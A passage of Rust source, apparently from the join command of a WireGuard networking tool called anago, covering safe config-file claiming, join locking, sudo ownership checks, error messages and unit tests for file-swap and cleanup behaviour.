            device_file: crate::paths::DEVICE_FILE.to_string(),
            device_claimed: false,
            committed: false,
        };
        // Claimed after the wg config, so a failure here releases that
        // one on the way out — and only that one.
        claim_user(
            client_dir,
            &reservation.device_file,
            client_paths,
            wg_config,
            owner,
        )?;
        reservation.device_claimed = true;
        Ok(reservation)
    }

    fn commit(&mut self) {
        self.committed = true;
    }
}

impl Drop for Reservation<'_> {
    fn drop(&mut self) {
        if self.committed {
            return;
        }
        let _ = std::fs::remove_file(self.wg_config);
        if self.device_claimed {
            let _ = self.client_dir.remove(&self.device_file);
        }
    }
}

/// Claims a path in a system directory, or takes over a marker an
/// earlier run left behind when it was killed.
fn claim_system(path: &Path) -> Result<(), JoinError> {
    match fsutil::create_new_private(path, CLAIM_MARKER) {
        Ok(()) => Ok(()),
        Err(e) if e.kind() == std::io::ErrorKind::AlreadyExists => {
            let existing = std::fs::read_to_string(path).unwrap_or_default();
            if is_stale_claim(&existing) {
                fsutil::write_private(path, CLAIM_MARKER).map_err(|e| JoinError::Save {
                    what: "a config file",
                    target: Target::system_file(path),
                    kind: e.kind(),
                    source: e.to_string(),
                })
            } else {
                Err(JoinError::ConfigExists(path.display().to_string()))
            }
        }
        Err(e) => Err(JoinError::Save {
            what: "a config file",
            target: Target::system_file(path),
            kind: e.kind(),
            source: e.to_string(),
        }),
    }
}

/// The same, for the device file, through the directory descriptor.
fn claim_user(
    dir: &fsutil::DirHandle,
    name: &str,
    client_paths: &ClientPaths,
    wg_config: &Path,
    owner: Owner,
) -> Result<(), JoinError> {
    // Both paths, because the recovery this error prints names both —
    // an empty one would tell somebody to run `wg-quick down ` with
    // nothing after it.
    let taken = || JoinError::AlreadyJoined {
        device_file: client_paths.device_file().display().to_string(),
        wg_config: wg_config.display().to_string(),
    };
    match dir.create_new_private(name, CLAIM_MARKER, owner) {
        Ok(()) => Ok(()),
        Err(e) if e.kind() == std::io::ErrorKind::AlreadyExists => {
            let existing = dir.read_to_string(name).unwrap_or_default();
            if is_stale_claim(&existing) {
                // Ours to reuse: an unfinished join owns nothing.
                dir.write_private(name, CLAIM_MARKER, owner)
                    .map_err(|e| JoinError::Save {
                        what: "a config file",
                        target: Target::user_file(client_paths.device_file()),
                        kind: e.kind(),
                        source: e.to_string(),
                    })
            } else {
                Err(taken())
            }
        }
        Err(e) => Err(JoinError::Save {
            what: "a config file",
            target: Target::user_file(client_paths.device_file()),
            kind: e.kind(),
            source: e.to_string(),
        }),
    }
}

/// Asks the hub to forget a peer this device could not finish joining.
///
/// Best effort by design: the token is fresh and the peer is one call
/// old, but if this fails too, [`recovery_note`] tells the person what
/// to do by hand.
fn undo_registration(
    domain: &str,
    api_port: u16,
    name: &DeviceName,
    token: &DeviceToken,
) -> Result<(), JoinError> {
    let path = format!(
        "{}/{}",
        proto::PATH_PEERS,
        client::encode_segment(name.as_str())
    );
    let response = client::send(&Request {
        method: Method::Delete,
        host: domain,
        port: api_port,
        path: &path,
        body: None,
        authorization: Some(&client::HeaderValue::device_token(token)),
    })
    .map_err(JoinError::Client)?;
    if response.is_success() {
        Ok(())
    } else {
        Err(JoinError::Refused(explain(response.status, &response.body)))
    }
}

/// Takes the lock that makes `anago join` single-file on this device.
///
/// Held from before the preflight until after the reservation is
/// released, because both ends matter: without it two joins can each
/// pass the check, and the one that fails would delete the other's
/// freshly written config on the way out.
///
/// Not a wait: a second join on one device is a mistake, not a queue.
pub fn acquire_join_lock(
    client_dir: &fsutil::DirHandle,
    invoking: Option<&InvokingUser>,
) -> Result<fsutil::FileLock, JoinError> {
    let owner = invoking.map(|user| (user.uid, user.gid));
    match client_dir.try_lock(crate::paths::JOIN_LOCK, owner) {
        Ok(Some(lock)) => Ok(lock),
        Ok(None) => Err(JoinError::AlreadyRunning),
        Err(e) => Err(JoinError::Save {
            what: "the join lock",
            target: Target::user_file(client_dir.path().join(crate::paths::JOIN_LOCK)),
            kind: e.kind(),
            source: e.to_string(),
        }),
    }
}

/// Opens the client config directory, checking it belongs to the person
/// who ran the command.
///
/// Under sudo the directory must already exist and already be theirs.
/// anago will not create it: doing so as root means `mkdir -p` over a
/// path they control, which is a way to have root apply an owner or a
/// mode to whatever a symlink points at — and it leaves a root-owned
/// `~/.config` behind for every other program to trip over.
///
/// The handle that comes back is what every later step uses, so the
/// check and the work are about the same directory even if the name is
/// moved in between.
fn prepare_client_dir(
    client_paths: &ClientPaths,
    invoking: Option<&InvokingUser>,
) -> Result<fsutil::DirHandle, JoinError> {
    let dir = client_paths.dir();
    let Some(user) = invoking else {
        fsutil::ensure_private_dir(dir).map_err(|e| JoinError::Save {
            what: "the config directory",
            target: Target::user_directory(dir),
            kind: e.kind(),
            source: e.to_string(),
        })?;
        return fsutil::DirHandle::open(dir).map_err(|e| JoinError::Save {
            what: "the config directory",
            target: Target::user_directory(dir),
            kind: e.kind(),
            source: e.to_string(),
        });
    };

    match fsutil::DirHandle::open_owned(dir, user.uid) {
        Ok(handle) => Ok(handle),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
            Err(JoinError::NoConfigDir(dir.display().to_string()))
        }
        // Not theirs, not a directory, or a symlink we refuse to follow
        // — all "sort this out yourself" rather than something anago
        // should fix as root.
        Err(e)
            if matches!(
                e.kind(),
                std::io::ErrorKind::PermissionDenied | std::io::ErrorKind::NotADirectory
            ) || is_symlink_loop(&e) =>
        {
            Err(JoinError::UnsafeConfigDir(dir.display().to_string()))
        }
        Err(e) => Err(JoinError::Save {
            what: "the config directory",
            target: Target::user_directory(dir),
            kind: e.kind(),
            source: e.to_string(),
        }),
    }
}

/// Refuses when this device has already joined something.
///
/// A second join would replace the token and the private key while the
/// hub still lists the old peer — the device would look registered from
/// both sides and work from neither.
pub fn check_not_joined(
    client_dir: &fsutil::DirHandle,
    client_paths: &ClientPaths,
    wg_config_path: &Path,
) -> Result<(), JoinError> {
    let device_file = client_paths.device_file();
    if occupied_at(client_dir, crate::paths::DEVICE_FILE) {
        return Err(JoinError::AlreadyJoined {
            device_file: device_file.display().to_string(),
            wg_config: wg_config_path.display().to_string(),
        });
    }
    if occupied(wg_config_path) {
        return Err(JoinError::ConfigExists(
            wg_config_path.display().to_string(),
        ));
    }
    Ok(())
}

/// [`occupied`] for a file inside the client directory, asked through
/// the descriptor rather than by path.
fn occupied_at(dir: &fsutil::DirHandle, name: &str) -> bool {
    match dir.read_to_string(name) {
        Ok(contents) => !is_stale_claim(&contents),
        // Present but unreadable — a directory, a symlink we refuse to
        // follow — is somebody's, not ours.
        Err(_) => dir.exists(name).unwrap_or(false),
    }
}

/// Whether a path holds something worth protecting — a leftover claim
/// from a killed run does not.
fn occupied(path: &Path) -> bool {
    match std::fs::read_to_string(path) {
        Ok(contents) => !is_stale_claim(&contents),
        // Unreadable but present (a directory, or bytes we cannot
        // decode) is somebody's, not ours.
        Err(_) => path.exists(),
    }
}

/// Fills the reserved files, or leaves neither usable.
///
/// The paths were claimed before the hub was contacted, so these writes
/// replace content this process already owns — no clobbering, and no
/// race with a second `anago join`. If the device file cannot be
/// written, the wg config goes with it: a private key on disk with no
/// token beside it is a state nothing can use and nothing can retry.
fn publish(
    config: &DeviceConfig,
    profile: &ClientProfile,
    to: &Destination,
) -> Result<(), JoinError> {
    fsutil::write_private(to.wg_config, wgconf::client_config(profile).expose()).map_err(|e| {
        JoinError::Save {
            what: "the WireGuard config",
            target: Target::system_file(to.wg_config),
            kind: e.kind(),
            source: e.to_string(),
        }
    })?;

    // Through the directory descriptor, and owned as it lands: this
    // write replaces the claim by rename, and a root-owned 0600
    // replacement is one the person cannot read with `anago ls`.
    if let Err(e) = to.client_dir.write_private(
        crate::paths::DEVICE_FILE,
        &config.to_json_string(),
        to.owner,
    ) {
        let _ = std::fs::remove_file(to.wg_config);
        return Err(JoinError::Save {
            what: "the device file",
            target: Target::user_file(to.client_paths.device_file()),
            kind: e.kind(),
            source: e.to_string(),
        });
    }
    Ok(())
}

/// Why a join did not finish.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum JoinError {
    /// The WireGuard tools are missing or failed.
    Wg(WgError),
    /// No `--name` and no usable hostname.
    NoName,
    /// The call did not happen.
    Client(client::ClientError),
    /// The hub answered, and said no.
    Refused(String),
    /// The hub answered with something this build cannot read — or
    /// something anago will not put in a config file.
    BadResponse(String),
    /// This device has already joined a network. Carries both files,
    /// because they do not live next to each other and a message that
    /// says "the one beside it" sends people looking in the wrong
    /// directory.
    AlreadyJoined {
        device_file: String,
        wg_config: String,
    },
    /// Another `anago join` is working on this device right now.
    AlreadyRunning,
    /// Under sudo, and the config directory is not there yet.
    NoConfigDir(String),
    /// Under sudo, and the config directory is not a plain directory
    /// belonging to the person who ran the command.
    UnsafeConfigDir(String),
    /// A WireGuard config with anago's name is already there.
    ConfigExists(String),
    /// A file could not be written. Carries the `ErrorKind` so the
    /// message can add what to do — running `anago join` as an
    /// ordinary user is the usual way to meet this one, since the wg
    /// config lives in a root-owned directory.
    Save {
        what: &'static str,
        /// What it was writing, and where. A directory that could not
        /// be created is its own culprit; a file's is the directory
        /// holding it.
        target: crate::diagnostics::Target,
        kind: std::io::ErrorKind,
        source: String,
    },
    /// The hub registered this device and this side could not finish —
    /// the one failure that leaves the two sides disagreeing. `what`
    /// says which side of the finish it was: files that could not be
    /// written, or a config that never reached the phone.
    SavedNothing {
        /// What did not happen, in the terms of the path that failed:
        /// a local join saves files, an export hands a config over.
        what: &'static str,
        source: String,
        recovery: String,
    },
    /// A rendered config could not be written to standard output — a
    /// closed pipe, most often. Its own variant because there is no
    /// file and no owner to blame, only a destination that went away.
    Unsent(String),
    /// The `--out` name stopped meaning the file anago created, while
    /// the hub was being asked.
    Taken(PathBuf),
    /// The terminal is too narrow to draw the code in.
    TooNarrow { needed: usize, available: usize },
    /// An existing `device.json` could not be read — raised by
    /// [`DeviceConfig::parse`], and so reached through `ls`/`rm` as
    /// well as through a re-`join`.
    DeviceFile(String),
}

impl fmt::Display for JoinError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            JoinError::Wg(e) => write!(f, "{e}"),
            JoinError::NoName => write!(
                f,
                "this machine's hostname is not a usable device name — pass --name"
            ),
            JoinError::Client(e) => write!(f, "{e}"),
            JoinError::Refused(detail) => write!(f, "{detail}"),
            JoinError::BadResponse(detail) => {
                write!(f, "the hub's answer made no sense: {detail}")
            }
            JoinError::NoConfigDir(path) => write!(
                f,
                "{path} does not exist — anago will not create it as root. \
                 Make it as yourself first: `mkdir -p {path}`"
            ),
            JoinError::UnsafeConfigDir(path) => write!(
                f,
                "{path} is not a directory you own — anago will not write into it as root. \
                 Check it with `ls -ld {path}`; a symlink or a root-owned directory there \
                 has to be sorted out first"
            ),
            JoinError::AlreadyRunning => write!(
                f,
                "another `anago join` is already running on this device — \
                 let it finish, or wait for it to fail"
            ),
            JoinError::AlreadyJoined {
                device_file,
                wg_config,
            } => write!(
                f,
                "this device has already joined a network — {device_file} exists. \
                 To join again: `sudo wg-quick down {wg_config}`, delete {wg_config} \
                 and {device_file}, and — if the hub still lists this device — \
                 `anago rm` it there"
            ),
            JoinError::ConfigExists(path) => write!(
                f,
                "{path} already exists — anago will not replace a WireGuard config \
                 it did not write. Move it aside first"
            ),
            JoinError::Save {
                what,
                target,
                kind,
                source,
            } => f.write_str(&crate::diagnostics::with_target_advice(
                format!(
                    "could not write {what} ({}): {source}",
                    target.path().display()
                ),
                Some(target),
                *kind,
            )),
            JoinError::SavedNothing {
                what,
                source,
                recovery,
            } => write!(
                f,
                "the hub registered this device but {what} ({source}) — {recovery}"
            ),
            JoinError::Unsent(detail) => write!(
                f,
                "the config could not be written to standard output: {detail} — so \
                 nothing reached the phone"
            ),
            JoinError::Taken(path) => write!(
                f,
                "{} was renamed, removed or replaced while the hub was being asked, so \
                 the config went into a file that no longer has that name — whatever \
                 is there now was left alone, and is not it",
                path.display()
            ),
            JoinError::TooNarrow { needed, available } => write!(
                f,
                "this terminal is {available} columns and the code needs {needed} — a \
                 QR wider than the window wraps, and a wrapped one still looks like a \
                 QR code. Widen the window and run this again, or use `--export conf` \
                 to hand the same config over as text"
            ),
            JoinError::DeviceFile(detail) => write!(f, "device file: {detail}"),
        }
    }
}

impl std::error::Error for JoinError {}


/// `ELOOP` — a symlink cycle (or a refused symlink under `O_NOFOLLOW`).
/// Unix-only as a raw code; Windows surfaces its own kinds, which the
/// caller's `ErrorKind` checks already cover.
#[cfg(unix)]
fn is_symlink_loop(e: &std::io::Error) -> bool {
    e.raw_os_error() == Some(libc::ELOOP)
}

#[cfg(windows)]
fn is_symlink_loop(_e: &std::io::Error) -> bool {
    false
}

#[cfg(test)]
mod tests {
    use super::*;
    use anago_core::proto::ApiError;

    fn response() -> JoinResponse {
        JoinResponse {
            name: "macbook".to_string(),
            address: "10.100.0.2".to_string(),
            subnet: "10.100.0.0/24".to_string(),
            token: "ab".repeat(32),
            server_public_key: "Xtt7u1I5qnMB8k6yMkjTDpJAc+3tPLPV9dg/yeb+qdE=".to_string(),
            server_endpoint: "net.example.com:51820".to_string(),
            server_address: "10.100.0.1".to_string(),
        }
    }

    fn config() -> DeviceConfig {
        DeviceConfig::from_response("net.example.com", 443, response())
    }

    #[test]
    fn the_device_file_keeps_what_later_commands_need() {
        let config = config();
        assert_eq!(config.domain, "net.example.com");
        // The normalized name, so `anago rm` can use it as typed here.
        assert_eq!(config.name, "macbook");
        assert_eq!(config.address, "10.100.0.2");
        assert_eq!(config.token, "ab".repeat(32));

        let text = config.to_json_string();
        assert_eq!(DeviceConfig::parse(&text).unwrap(), config);
        // §9.2 pins these names.
        assert!(text.contains("\"version\": 1"), "{text}");
        assert!(
            text.contains("\"server_endpoint\": \"net.example.com:51820\""),
            "{text}"
        );
    }

    #[test]
    fn the_hubs_address_comes_back_typed() {
        assert_eq!(config().server_ip().unwrap().to_string(), "10.100.0.1");
        let mut broken = config();
        broken.server_address = "10.100.0.999".to_string();
        assert_eq!(broken.server_ip(), None);
    }

    #[test]
    fn an_exported_config_is_the_same_profile_without_the_comments() {
        // §8: identical fields in identical order, because a phone
        // needs exactly what a laptop needs. What it drops is the
        // "generated file" comment, which would be a lie — anago never
        // sees this file again.
        let profile = profile_of(&config());
        let phone = wgconf::export_profile(&profile);
        let laptop = wgconf::client_config(&profile);
        assert!(phone.expose().contains("[Interface]"), "{}", phone.expose());
        assert!(phone.expose().contains("[Peer]"), "{}", phone.expose());
        for line in phone.expose().lines() {
            assert!(!line.starts_with('#'), "{line}");
            assert!(
                laptop.expose().contains(line),
                "{line} is not in the laptop's config"
            );
        }
        // The rendered text is the one thing that carries the key out.
        assert!(phone.expose().contains("PrivateKey"), "{}", phone.expose());
        // And it says so nowhere else: both wrappers redact.
        assert_eq!(format!("{phone:?}"), "SecretText(redacted)");
        assert_eq!(format!("{phone}"), "SecretText(redacted)");
    }

    #[test]
    fn an_out_file_is_taken_before_the_code_is_spent() {
        // A local join claims its two files before asking the hub for
        // anything, so a permission problem is a retry rather than a
        // dead end. An export has one file and the same rule.
        let dir = TempDirs::new();
        let path = dir.root.join("phone.conf");

        let mut claimed = Claimed::take(&path).unwrap();
        assert!(path.exists(), "claimed up front");
        assert_eq!(mode_of(&path), 0o600, "§7.3: anago's own file is 0600");
        assert_eq!(std::fs::read_to_string(&path).unwrap(), "");

        claimed
            .fill(&wgconf::export_profile(&profile_of(&config())))
            .unwrap();
        claimed.keep();
        drop(claimed);
        let written = std::fs::read_to_string(&path).unwrap();
        assert!(written.contains("PrivateKey"), "{written}");
        assert_eq!(mode_of(&path), 0o600, "and still is after the write");
    }

    #[test]
    fn an_export_that_does_not_finish_leaves_no_file() {
        // The same shape as the local join's reservation: the claim
        // deletes itself unless the export gets all the way through, so
        // a hub call that fails does not leave an empty `phone.conf`
        // for somebody to send to a phone.
        let dir = TempDirs::new();
        let path = dir.root.join("phone.conf");
        drop(Claimed::take(&path).unwrap());
        assert!(!path.exists(), "{}", path.display());
    }

    #[test]
    fn an_export_never_writes_over_a_file_that_is_already_there() {
        // §7.3, and the reason it is `O_EXCL` rather than a check: a
        // person's existing profile is not something to overwrite by
        // accident, and between looking and writing somebody could put
        // one there.
        let dir = TempDirs::new();
        let path = dir.root.join("phone.conf");
        std::fs::write(&path, "somebody else's config\n").unwrap();

        let e = Claimed::take(&path).unwrap_err();
        assert!(matches!(
            e,
            JoinError::Save {
                kind: std::io::ErrorKind::AlreadyExists,
                ..
            }
        ));
        // Untouched, including by the failed claim's own cleanup.
        assert_eq!(
            std::fs::read_to_string(&path).unwrap(),
            "somebody else's config\n"
        );
    }

    #[test]
    fn a_name_that_stopped_meaning_our_file_is_not_written_off_as_success() {
        // Between the claim and the answer, anybody with write access
        // to that directory — `/tmp` is the ordinary case — can rename
        // the file away and put their own at the name. The config went
        // into the file this run made, which nobody can reach by the
        // name they typed, so reporting "written to phone.conf" would
        // be a sentence about somebody else's file.
        let dir = TempDirs::new();
        let path = dir.root.join("phone.conf");

        let mut claimed = Claimed::take(&path).unwrap();
        std::fs::rename(&path, dir.root.join("stolen.conf")).unwrap();
        std::fs::write(&path, "somebody else's config\n").unwrap();

        let e = claimed
            .fill(&wgconf::export_profile(&profile_of(&config())))
            .unwrap_err();
        assert_eq!(e, JoinError::Taken(path.clone()));
        assert!(e.to_string().contains("left alone"), "{e}");

        // Dropped without `keep`, and it still leaves the replacement
        // exactly as it found it — §7.3 promises anago deletes no file
        // it did not create.
        drop(claimed);
        assert_eq!(
            std::fs::read_to_string(&path).unwrap(),
            "somebody else's config\n"
        );
    }

    #[test]
    #[cfg(unix)] // exercises unix modes/ownership/symlinks
    fn a_cleanup_deletes_only_the_file_it_made() {
        let dir = TempDirs::new();
        let path = dir.root.join("phone.conf");

        // Replaced outright, without the claim ever being filled.
        let claimed = Claimed::take(&path).unwrap();
        std::fs::remove_file(&path).unwrap();
        std::fs::write(&path, "not ours\n").unwrap();
        drop(claimed);
        assert_eq!(std::fs::read_to_string(&path).unwrap(), "not ours\n");
        std::fs::remove_file(&path).unwrap();

        // A symlink dropped at the name is a mismatch too, not a
        // follow-through to whatever it points at.
        let target = dir.root.join("elsewhere.conf");
        std::fs::write(&target, "elsewhere\n").unwrap();
        let claimed = Claimed::take(&path).unwrap();
        std::fs::remove_file(&path).unwrap();
        std::os::unix::fs::symlink(&target, &path).unwrap();
        drop(claimed);
        assert_eq!(std::fs::read_to_string(&target).unwrap(), "elsewhere\n");
        assert!(
            path.symlink_metadata().is_ok(),
            "the symlink is still there"
        );

        // And the ordinary ending still cleans up after itself.
        std::fs::remove_file(&path).unwrap();
        drop(Claimed::take(&path).unwrap());
        assert!(!path.exists(), "{}", path.display());
    }

    #[test]
    fn a_stolen_out_file_undoes_the_registration() {
        // The phone never got its config, so a name and an address on
        // the hub belong to nothing. Same door as every other failure
        // after the hub answers.
        let e = JoinError::Taken(PathBuf::from("/tmp/phone.conf"));
        let after = post_registration(
            &body_with_credentials(),
            "net.example.com",
            443,
            NOTHING_HANDED_OVER,
            &e,
        );
        assert!(matches!(after, JoinError::SavedNothing { .. }), "{after:?}");
        assert!(after.to_string().contains("/tmp/phone.conf"), "{after}");
    }

    /// A note's words, with the hand-made wrapping taken back out —
    /// so an assertion is about what it says, not where a line broke.
    fn flowed(note: &str) -> String {
        note.lines().map(str::trim).collect::<Vec<_>>().join(" ")
    }

    #[test]
    fn the_note_says_what_leaked_and_what_to_do_about_it() {
        let name = DeviceName::parse("폰").unwrap();

        let piped = export_note(&name, &Handed::Text);
        assert!(piped.contains("private key, in plain text"), "{piped}");
        assert!(piped.contains("scrollback"), "{piped}");
        // §7.3: always, without looking at where stdout goes. A shell
        // redirect takes its mode from the umask; anago's own file does
        // not.
        assert!(piped.contains("--out rather than `>`"), "{piped}");
        assert!(piped.contains("0644"), "{piped}");

        let filed = export_note(&name, &Handed::File(PathBuf::from("/home/jo/phone.conf")));
        assert!(filed.contains("/home/jo/phone.conf (0600)"), "{filed}");
        assert!(filed.contains("`rm /home/jo/phone.conf`"), "{filed}");
        // The risk that is specific to a file rather than a screen.
        assert!(filed.contains("cloud-synced"), "{filed}");
        assert!(!filed.contains("scrollback"), "{filed}");

        // §8: the token is thrown away, so the phone cannot remove
        // itself and somebody has to be told where that happens.
        // A QR takes no `--out` at all (§10.2), so sending somebody to
        // one would be advice for a flag this path refuses.
        let drawn = export_note(&name, &Handed::Qr);
        assert!(drawn.contains("Scan it"), "{drawn}");
        assert!(drawn.contains("photograph"), "{drawn}");
        assert!(!drawn.contains("--out rather than"), "{drawn}");
        assert!(drawn.contains("--export conf --out <path>"), "{drawn}");
        // A picture is not safer than the words, and calling it plain
        // text would let somebody believe it is.
        assert!(!drawn.contains("in plain text"), "{drawn}");
        assert!(
            flowed(&drawn).contains("Anything that can read it has the key"),
            "{drawn}"
        );

        // §7.3: the key is on the screen *and* in the record, and the
        // two are cleared by different commands. `clear` empties the
        // screen and files it into the scrollback; `clear-history`
        // empties the scrollback and leaves the pane as it is. A note
        // that named only one would read as a complete instruction and
        // leave the key in the half it did not mention.
        for screen in [&piped, &drawn] {
            let said = flowed(screen);
            assert!(
                said.contains("off the screen and out of the record"),
                "{screen}"
            );
            assert!(said.contains("neither on its own is enough"), "{screen}");
            // The screen half, and the record half.
            assert!(
                said.contains("`clear` (or Ctrl-L) takes it off the screen"),
                "{screen}"
            );
            assert!(said.contains("puts it in the scrollback"), "{screen}");
            assert!(said.contains("Clear Scrollback in its menu"), "{screen}");
            assert!(said.contains("`clear-history` under tmux"), "{screen}");
            // And the order, which is not arbitrary: clearing the
            // record first only files the screen away after it.
            assert!(said.contains("In that order"), "{screen}");
        }
        // A file leaves nothing on the screen to clear.
        assert!(!filed.contains("scrollback"), "{filed}");

        for note in [piped, filed, drawn] {
            assert!(note.contains("The hub knows this phone as 폰"), "{note}");
            assert!(note.contains("`anago rm 폰`"), "{note}");
            // What the phone cannot do is remove *itself* — it kept no
            // token (§8). Removing it is ordinary, and the API
            // authenticates the caller rather than the subject, so any
            // joined device can. Naming only the hub would send
            // somebody to the server for something the laptop in front
            // of them does.
            let said = flowed(&note);
            assert!(said.contains("cannot do is remove itself"), "{note}");
            assert!(said.contains("or on any device that has joined"), "{note}");
            // Laid out by hand, so no blank line carries invisible
            // spaces and no line trails off with them either.
            for line in note.lines() {
                assert_eq!(line, line.trim_end(), "{line:?}");
            }
        }
    }

    #[test]
    fn a_window_that_could_never_hold_a_code_refuses_before_the_code_is_spent() {
        // The exact size needs the hub's answer, so most of that check
        // has to wait. This half does not: a window too narrow for the
        // smallest QR there is could not hold whatever comes back
        // either, and a join code is single use.
        let floor = anago_core::qr::columns(anago_core::qr::SMALLEST, anago_core::qr::Blocks::Half);
        assert_eq!(floor, 29, "version 1 plus its quiet zone, compact");

        let e = JoinError::TooNarrow {
            needed: 65,
            available: 40,
        };
        assert!(e.to_string().contains("40 columns"), "{e}");
        assert!(e.to_string().contains("needs 65"), "{e}");
        // Both ways out: the one they can act on now, and the one that
        // does not depend on the window at all.
        assert!(e.to_string().contains("Widen the window"), "{e}");
        assert!(e.to_string().contains("--export conf"), "{e}");
        assert_eq!(e.to_string().lines().count(), 1, "{e}");

        // Found after the answer, it goes out through the same door
        // every post-registration failure does — the phone got nothing,
        // so the hub must not keep a name and an address for it.
        let after = post_registration(
            &body_with_credentials(),
            "net.example.com",
            443,
            NOTHING_HANDED_OVER,
            &e,
        );
        assert!(matches!(after, JoinError::SavedNothing { .. }), "{after:?}");
        assert!(after.to_string().contains("Widen the window"), "{after}");
    }

    #[test]
    #[cfg(unix)] // exercises unix modes/ownership/symlinks
    fn a_config_that_never_reached_the_phone_says_so() {
        // A closed pipe — `anago join … --export conf | head -1`. The
        // registration stands, so this goes out through the same door
        // every post-registration failure does.
        let e = JoinError::Unsent("Broken pipe (os error 32)".to_string());
        assert!(e.to_string().contains("nothing reached the phone"), "{e}");

        let after = post_registration(
            &body_with_credentials(),
            "net.example.com",
            443,
            NOTHING_HANDED_OVER,
            &e,
        );
        assert!(matches!(after, JoinError::SavedNothing { .. }), "{after:?}");
        assert!(
            after.to_string().contains("nothing reached the phone"),
            "the cause survives: {after}"
        );
    }

    fn mode_of(path: &Path) -> u32 {
        #[cfg(unix)]
        use std::os::unix::fs::PermissionsExt;
        std::fs::metadata(path)
            .expect("metadata")
            .permissions()
            .mode()
            & 0o777
    }

    fn body_with_credentials() -> String {
        format!(
            "{{\"name\": \"폰\", \"token\": {:?}, \"address\": \"10.100.0.3\"}}",
            "ab".repeat(32)
        )
    }

    #[test]
    fn the_private_key_is_not_in_the_device_file() {
        // §6.2: it never leaves the machine, and §9.2 keeps it out of
        // this file — it lives in the wg config alone.
        let text = config().to_json_string();
        assert!(!text.contains("private"), "{text}");
        assert!(!text.contains("PrivateKey"), "{text}");
    }

    #[test]
    fn a_device_file_without_a_port_is_not_assumed_to_mean_443() {
        // The build before this field existed already accepted
        // --api-port; it just did not save it. So "absent" means
        // "unknown", and guessing 443 would fail as though the hub were
        // down.
        let text = config()
            .to_json_string()
            .replace("  \"api_port\": 443,\n", "");
        assert!(!text.contains("api_port"), "{text}");
        let e = DeviceConfig::parse(&text).unwrap_err();
        let message = e.to_string();
        assert!(message.contains("earlier build"), "{message}");
        assert!(message.contains("Add \"api_port\""), "{message}");
        assert!(message.contains("443"), "the likely value: {message}");
        // Not a re-join: `check_not_joined` would refuse while these
        // files exist, and the hub already has the name.
        assert!(!message.contains("join again"), "{message}");

        // Present but nonsense is still an error.
        let text = config()
            .to_json_string()
            .replace("\"api_port\": 443", "\"api_port\": 0");
        assert!(DeviceConfig::parse(&text).is_err());
    }

    #[test]
    fn a_device_file_from_another_version_is_refused() {
        let text = config()
            .to_json_string()
            .replace("\"version\": 1", "\"version\": 2");
        let e = DeviceConfig::parse(&text).unwrap_err();
        assert!(e.to_string().contains("version 2"), "{e}");

        assert!(DeviceConfig::parse("{}").is_err());
        assert!(DeviceConfig::parse("not json").is_err());
        let missing = config().to_json_string().replace("\"token\"", "\"tokenn\"");
        assert!(DeviceConfig::parse(&missing)
            .unwrap_err()
            .to_string()
            .contains("token"));
    }

    #[test]
    fn the_request_body_is_what_the_hub_expects() {
        let body = request_body(
            &JoinCode::parse("7QX4-M2KD").unwrap(),
            &DeviceName::parse("맥북").unwrap(),
            "Xtt7u1I5qnMB8k6yMkjTDpJAc+3tPLPV9dg/yeb+qdE=",
        );
        assert_eq!(
            body,
            r#"{"code":"7QX4-M2KD","name":"맥북","public_key":"Xtt7u1I5qnMB8k6yMkjTDpJAc+3tPLPV9dg/yeb+qdE="}"#
        );
        // And the hub can read it back.
        assert_eq!(
            JoinRequest::from_json(&json::parse(&body).unwrap())
                .unwrap()
                .name,
            "맥북"
        );
    }

    #[test]
    fn a_hostname_becomes_a_usable_name() {
        assert_eq!(
            name_from_hostname("MacBook-Pro.local").unwrap().as_str(),
            "macbook-pro"
        );
        assert_eq!(name_from_hostname("vps1").unwrap().as_str(), "vps1");
        assert_eq!(name_from_hostname("my mac").unwrap().as_str(), "my-mac");
        assert_eq!(
            name_from_hostname("desktop.lan").unwrap().as_str(),
            "desktop"
        );
        // Reserved and empty names are not invented around.
        assert_eq!(name_from_hostname("server"), None);
        assert_eq!(name_from_hostname(""), None);
        assert_eq!(name_from_hostname("..."), None);
        assert_eq!(name_from_hostname("---"), None);
    }

    #[test]
    fn each_refusal_says_what_to_do_next() {
        let body = |code: ErrorCode, message: &str| {
            json::to_string(&ApiError::new(code, message).to_json())
        };

        let text = explain(
            403,
            &body(ErrorCode::InvalidCode, "that join code is not valid"),
        );
        assert!(text.contains("that join code is not valid"), "{text}");
        assert!(text.contains("`anago code` on the server"), "{text}");

        let text = explain(409, &body(ErrorCode::NameTaken, "already registered"));
        assert!(text.contains("--name"), "{text}");

        let text = explain(507, &body(ErrorCode::SubnetFull, "no free address"));
        assert!(text.contains("remove a device first"), "{text}");

        // A body that is not one of ours still reaches the person.
        let text = explain(502, "<html>bad gateway</html>");
        assert!(text.contains("HTTP 502"), "{text}");
        assert!(text.contains("bad gateway"), "{text}");
    }

    #[test]
    fn the_profile_carries_the_key_the_hub_never_saw() {
        let profile = config()
            .profile(PrivateKey::new("ZGV2aWNlIHByaXZhdGU="))
            .unwrap();
        assert_eq!(profile.address.to_string(), "10.100.0.2");
        assert_eq!(profile.subnet.to_string(), "10.100.0.0/24");
        assert_eq!(profile.server_endpoint, "net.example.com:51820");

        let rendered = wgconf::client_config(&profile);
        let text = rendered.expose();
        assert!(text.contains("PrivateKey = ZGV2aWNlIHByaXZhdGU="), "{text}");
        assert!(text.contains("AllowedIPs = 10.100.0.0/24"), "{text}");
    }

    #[test]
    fn a_nonsense_address_or_subnet_is_caught_before_a_config_is_written() {
        let mut config = config();
        config.address = "not an address".to_string();
        assert!(matches!(
            config.profile(PrivateKey::new("k")),
            Err(JoinError::BadResponse(_))
        ));

        let mut config = super::tests::config();
        config.subnet = "10.100.0.0/16".to_string();
        let e = config.profile(PrivateKey::new("k")).unwrap_err();
        assert!(e.to_string().contains("/24 only"), "{e}");
    }

    // ----------------------------------------------- local publication

    struct TempDirs {
        root: std::path::PathBuf,
        client: ClientPaths,
        wg_config: std::path::PathBuf,
    }

    impl TempDirs {
        fn new() -> TempDirs {
            use std::sync::atomic::{AtomicU32, Ordering};
            static COUNTER: AtomicU32 = AtomicU32::new(0);
            let unique = COUNTER.fetch_add(1, Ordering::Relaxed);
            let root =
                std::env::temp_dir().join(format!("anago-join-{}-{unique}", std::process::id()));
            let client = ClientPaths::new(root.join("config"));
            std::fs::create_dir_all(client.dir()).unwrap();
            std::fs::create_dir_all(root.join("wireguard")).unwrap();
            TempDirs {
                wg_config: root.join("wireguard").join("anago.conf"),
                client,
                root,
            }
